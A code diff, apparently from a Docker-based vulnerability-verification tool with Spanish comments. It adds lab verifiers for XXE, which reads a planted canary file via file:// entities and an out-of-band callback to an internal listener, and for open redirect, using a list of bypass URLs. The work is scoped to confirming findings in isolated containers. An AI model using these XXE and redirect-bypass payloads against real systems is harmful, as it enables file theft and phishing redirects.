@@ -18,8 +18,10 @@ import subprocess
 import time
 from typing import Callable, List, Optional
 
-from .wpverify import (WpVerifyResult, _ALPINE_IMAGE, _PATH_HINTS, _SQLI_HINTS, _URL_HINTS,
-                       _docker_daemon_ok, _lab_host, _pick_param, _run, _token)
+from .wpverify import (WpVerifyResult, _ALPINE_IMAGE, _PATH_HINTS, _REDIRECT_HINTS, _SQLI_HINTS,
+                       _URL_HINTS, _XML_HINTS, _docker_daemon_ok, _lab_host, _pick_param, _run,
+                       _token)
+import secrets
 
 _COMPOSE_NAMES = ("docker-compose.yml", "docker-compose.yaml", "compose.yml", "compose.yaml")
 
@@ -129,7 +131,14 @@ class _GenericLab:
     def discover_http(self, tries: int = 60, delay: float = 3.0) -> Optional[tuple]:
         """Prueba TODOS los puertos publicados de TODOS los contenedores levantados hasta que uno
         responda HTTP (status < 500) -- sin asumir cual de los contenedores del compose es el
-        servidor web ni en que puerto escucha. Devuelve (container, port) o None."""
+        servidor web ni en que puerto escucha. Devuelve (container, port) o None.
+
+        urlopen() LANZA HTTPError para cualquier respuesta 4xx/5xx en vez de devolverla (solo los
+        2xx/3xx llegan al `with` de abajo) -- confirmado en vivo que, sin capturarla aparte, un
+        objetivo que solo expone rutas POST (su raiz responde 404/501, no 2xx) nunca se detectaba
+        como 'listo' aunque estuviera arriba de verdad. Una URLError (sin respuesta HTTP en
+        absoluto -- conexion rechazada, nombre no resuelto) si sigue significando 'aun no'."""
+        import urllib.error
         import urllib.request
         host = _lab_host()
         for _ in range(tries):
@@ -139,6 +148,9 @@ class _GenericLab:
                         with urllib.request.urlopen(f"http://{host}:{port}/", timeout=4) as r:
                             if r.status < 500:
                                 return (c, port)
+                    except urllib.error.HTTPError as e:
+                        if e.code < 500:
+                            return (c, port)
                     except Exception:
                         continue
             time.sleep(delay)
@@ -696,6 +708,260 @@ def verify_generic_sqli_blind(
                           f"ciega por tiempo no se confirmo (puede que el endpoint/parametro no "
                           f"sean los reales, que el motor no soporte ninguno de los dialectos "
                           f"probados, o que de verdad no haya inyeccion)")
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
+        lab.teardown()
+
+
+def verify_generic_xxe(
+    source_dir: str, endpoint: str, http_method: str, parameters,
+    xml_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+) -> WpVerifyResult:
+    """Analogo generico de verify_wordpress_xxe: planta un canario dentro del contenedor real
+    del objetivo y prueba las mismas variantes de entidad externa (DOCTYPE normal, parametro-
+    entidad, envuelta en SOAP) como parametro de formulario y como cuerpo crudo
+    (application/xml, text/xml). Si ninguna devuelve el secreto en banda, cae al mismo fallback
+    OOB/ciego via el listener interno que SSRF -- el mecanismo (parser XML resolviendo
+    file://, o una URL externa) no depende del stack que procese el XML."""
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    xml_param = xml_param_hint or _pick_param(parameters, _XML_HINTS)
+
+    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
+    if boot is None:
+        return res
+    lab, base_url, container = boot
+    try:
+        import requests
+        secret = secrets.token_hex(16)
+        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
+        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
+             f"contenedor del objetivo)...")
+        if not lab.write_canary(container, canary_path, secret):
+            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
+            return res
+
+        xxe_general = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
+                       f'"file://{canary_path}">]><foo>&xxe;</foo>')
+        xxe_param_entity = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
+                           f'"file://{canary_path}"> %xxe; ]><foo>test</foo>')
+        xxe_soap = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
+                   f'"file://{canary_path}">]><soap:Envelope '
+                   f'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>'
+                   f'<foo>&xxe;</foo></soap:Body></soap:Envelope>')
+        xml_variants = [("entidad general (DOCTYPE normal)", xxe_general),
+                        ("parametro-entidad", xxe_param_entity),
+                        ("envuelta en SOAP", xxe_soap)]
+
+        m = (http_method or "GET").upper()
+        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
+                             "metodo": m, "xml_param": xml_param or "(cuerpo crudo)",
+                             "canary_path": canary_path, "canary_secret": secret})
+
+        tried = []
+        found = False
+
+        def try_send(label, **kwargs):
+            nonlocal found
+            try:
+                resp = requests.request(m, base_url + endpoint, timeout=20, **kwargs)
+            except Exception as e:
+                tried.append({"modo": label, "error": str(e)})
+                return
+            present = secret in (resp.text or "")
+            tried.append({"modo": label, "status": resp.status_code, "secreto_presente": present})
+            if present and not found:
+                found = True
+                res.evidence["modo_ganador"] = label
+                res.evidence["status_code_respuesta"] = resp.status_code
+                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta ({label}).")
+
+        for label, xml_body in xml_variants:
+            if found:
+                break
+            if xml_param:
+                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+                payload[xml_param] = xml_body
+                try_send(f"{label}, parametro de formulario",
+                         data=payload if m != "GET" else None,
+                         params=payload if m == "GET" else None)
+            if not found:
+                try_send(f"{label}, cuerpo crudo application/xml", data=xml_body.encode(),
+                         headers={"Content-Type": "application/xml"})
+            if not found:
+                try_send(f"{label}, cuerpo crudo text/xml", data=xml_body.encode(),
+                         headers={"Content-Type": "text/xml"})
+
+        res.evidence["intentos"] = tried
+
+        if not found:
+            step("ninguna variante en banda devolvio el secreto; probando XXE ciego/OOB via el "
+                 "listener interno...")
+            listener = lab.start_listener()
+            if listener:
+                oob_token = _token()
+                oob_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
+                          f'"http://{lab.listener}:8080/binoracle-xxe-oob-{oob_token}">]>'
+                          f'<foo>&xxe;</foo>')
+                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+                try:
+                    if xml_param:
+                        payload[xml_param] = oob_xml
+                        requests.request(m, base_url + endpoint, timeout=20,
+                                        data=payload if m != "GET" else None,
+                                        params=payload if m == "GET" else None)
+                    else:
+                        requests.request(m, base_url + endpoint, data=oob_xml.encode(),
+                                        headers={"Content-Type": "application/xml"}, timeout=20)
+                except Exception:
+                    pass
+                time.sleep(2)
+                oob_log = lab.listener_log()
+                oob_hit = oob_token in oob_log
+                res.evidence["oob_intento"] = {"token": oob_token, "hit": oob_hit}
+                if oob_hit:
+                    found = True
+                    res.evidence["tecnica"] = "oob-blind"
+                    res.evidence["modo_ganador"] = "OOB via listener interno"
+
+        if found:
+            res.verified = True
+            res.ok = True
+            if res.evidence.get("tecnica") == "oob-blind":
+                res.detail = ("XXE ciego/OOB confirmado: el parser XML intento resolver una "
+                              "entidad externa apuntando a un listener interno (inalcanzable "
+                              "desde fuera del laboratorio), y la conexion llego con el token "
+                              "exacto -- prueba de que el parser resuelve entidades externas "
+                              "arbitrarias, aunque no se extrajo el contenido del fichero")
+            else:
+                res.detail = (f"XXE confirmada ({res.evidence['modo_ganador']}): la respuesta "
+                              f"contiene el secreto exacto plantado en {canary_path} -- el "
+                              f"parser XML resolvio una entidad externa apuntando al sistema de "
+                              f"ficheros real")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} formas de mandar la entidad externa (en "
+                          f"banda) y el intento OOB via listener interno, y ninguna confirmo "
+                          f"nada -- el XXE no se confirmo (puede que el parser tenga las "
+                          f"entidades externas desactivadas, o el endpoint/parametro no son los "
+                          f"reales)")
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
+        lab.teardown()
+
+
+def verify_generic_open_redirect(
+    source_dir: str, endpoint: str, http_method: str, parameters,
+    redirect_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+) -> WpVerifyResult:
+    """Analogo generico de verify_wordpress_open_redirect: manda la misma bateria de variantes de
+    URL externa/bypass (directa, protocol-relative, backslash, userinfo, espacios/tabs,
+    subdominio del host confiable) con allow_redirects=False, y solo marca verificado si la
+    respuesta es un 3xx con Location conteniendo el dominio externo exacto -- el mecanismo de
+    prueba (inspeccionar la cabecera Location real) no depende del stack."""
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    redirect_param = redirect_param_hint or _pick_param(parameters, _REDIRECT_HINTS)
+    if not redirect_param:
+        res.detail = "no se identifico el parametro que lleva la URL de destino"
+        res.limitations.append("la verificacion de open redirect necesita saber que parametro "
+                               "lleva la URL de destino; afina 'parameters' o pasalo a mano "
+                               "(redirect_param_hint)")
+        return res
+
+    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
+    if boot is None:
+        return res
+    lab, base_url, container = boot
+    try:
+        import requests
+        token = _token()
+        evil_host = f"binoracle-lab-redirect-{token}.invalid"
+        targets = [
+            f"https://{evil_host}/pwned",
+            f"//{evil_host}/pwned",
+            f"https:/\\{evil_host}/pwned",
+            f"https:\\\\{evil_host}\\pwned",
+            f"https://trusted.example.com@{evil_host}/pwned",
+            f"https://{evil_host}\\@trusted.example.com/pwned",
+            f" https://{evil_host}/pwned",
+            f"\thttps://{evil_host}/pwned",
+            f"https://{evil_host}#@trusted.example.com/",
+            f"https://trusted.example.com.{evil_host}/pwned",
+        ]
+        m = (http_method or "GET").upper()
+        tried = []
+        confirmed_entry = None
+        for target in targets:
+            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload[redirect_param] = target
+            try:
+                resp = requests.request(m, base_url + endpoint, timeout=15,
+                                        data=payload if m != "GET" else None,
+                                        params=payload if m == "GET" else None,
+                                        allow_redirects=False)
+            except Exception as e:
+                tried.append({"target": target, "error": str(e)})
+                continue
+            location = resp.headers.get("Location", "")
+            is_redirect = resp.status_code in (301, 302, 303, 307, 308)
+            confirmed = is_redirect and evil_host in location
+            tried.append({"target": target, "status": resp.status_code, "location": location,
+                         "confirmado": confirmed})
+            if confirmed:
+                confirmed_entry = tried[-1]
+                break
+        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
+                             "redirect_param": redirect_param, "dominio_externo_esperado": evil_host,
+                             "metodo": m, "intentos": tried})
+
+        if confirmed_entry:
+            res.verified = True
+            res.ok = True
+            res.evidence["status_code_respuesta"] = confirmed_entry["status"]
+            res.evidence["location_recibida"] = confirmed_entry["location"]
+            res.evidence["url_externa_ganadora"] = confirmed_entry["target"]
+            res.detail = (f"OPEN REDIRECT confirmado: la peticion con {redirect_param}="
+                          f"{confirmed_entry['target']!r} produjo un {confirmed_entry['status']} "
+                          f"con Location={confirmed_entry['location']!r} -- el servidor redirige "
+                          f"de verdad a un dominio externo controlado por el atacante")
+            step(f"VERIFICADO: Location={confirmed_entry['location']!r} contiene el dominio "
+                 f"externo enviado.")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} variantes de bypass (directa, "
+                          f"protocol-relative, backslash, userinfo, espacios/tabs, subdominio) "
+                          f"para {redirect_param} y ninguna produjo un redirect con "
+                          f"'{evil_host}' en Location -- el open redirect no se confirmo")
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
